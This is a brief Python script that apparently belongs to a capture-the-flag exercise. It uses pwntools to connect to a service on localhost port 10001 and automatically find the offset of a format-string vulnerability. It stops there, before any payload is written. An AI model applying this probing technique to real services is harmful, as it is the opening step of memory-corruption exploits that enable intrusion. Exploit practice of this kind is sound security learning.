from pwn import *

io = remote('127.0.0.1', '10001')

def exec_fmt(payload):
    io.sendline(payload)
    info = io.recv()
    return info
auto = FmtStr(exec_fmt)
offset = auto.offset
